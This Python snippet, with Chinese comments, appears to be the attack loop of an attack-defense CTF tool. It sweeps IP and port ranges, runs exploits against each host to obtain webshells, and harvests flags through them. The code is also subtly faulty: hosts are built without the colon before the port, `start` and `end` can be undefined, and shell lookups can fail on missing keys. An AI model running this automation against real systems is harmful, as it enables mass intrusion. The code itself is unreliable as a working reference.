def run(cfg,exploits,webshells,flag_queue):
    T = [] #不同题目的攻击线程
    for web,ip_section in cfg.attack.items(): 
        T.append(Thread(target=attack,args=(web,ip_section)))
    for t in T:
        log.info('题目{}攻击线程启动'.format(web))
        t.start()

def attack(web,ipsection):
    while True:
        for host in get_victim(ipsection):
            flag = ''

            if not webshells.get(host):  #获取权限或flag
                shell,flag = '',''
                for attack in exploits[web]:
                    shell,flag = attack.attack(host)
                    if shell:
                        log.debug('主机{}成功getshell-{}'.format(host,shell))
                        webshells[host] = shell   #权限获取成功
                        break
            
            flag = get_flag(webshells[host])
            if flag:
                flag_queue.put(flag)
                log.debug('主机{}的flag获取成功-{}'.format(host,flag))
                break
            log.info('主机{}攻击失败'.format(host))
        time.sleep(3)


def get_victim(ip_string): #123.123.1-255.123:1231 || 123.123.123.123:222-333
    ip , port = ip_string.split(':')
    ip = ip.split('.')
    parts = [*ip,port]  #
    for i in range(5):
        if '-' in parts[i]:
            start,end = parts[i].split('-')
            parts[i] = '{}'
            break
    host = '.'.join([*parts[:-1]])+parts[-1]
    for i in range(int(start),int(end)+1):
        yield host.format(i)

